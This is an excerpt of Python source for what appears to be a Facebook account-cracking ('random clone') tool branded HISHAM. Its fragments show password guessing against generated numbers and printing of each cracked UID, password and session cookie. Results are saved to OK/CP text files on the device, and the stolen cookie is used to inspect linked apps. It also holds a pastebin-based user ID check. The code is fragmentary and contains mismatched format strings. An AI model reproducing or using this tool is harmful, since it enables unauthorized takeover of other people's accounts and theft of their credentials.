...
def subc():
   ...
   id="|".join(uuid)
   ses=requests.get("https://pastebin.com/av0Du0LZ").text
   if id in ses:
   	pass
   else:
   	print("Your Id "+id)
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mhisham1-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mhisham1-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97hisham1-2F.txt' %
              (H, P, str(len(twf))))
...
def cek_apk(session,coki):
    ...
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED libya 🎮%s'%(ORANGE))
    else:
        print(f'\r 🎮  %{RED}sYOUR EXPIRED libya DETAILS :'%(RED))
        for i in range(len(game)):
...
def xyz():
    ...
    print(f"")
    print(f"{BLUE}[01] {GREEN}RANDOM CLONE LY  M1")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[HISHAM-OK]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/hisham1-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[HISHAM-CP]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/hisham1-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
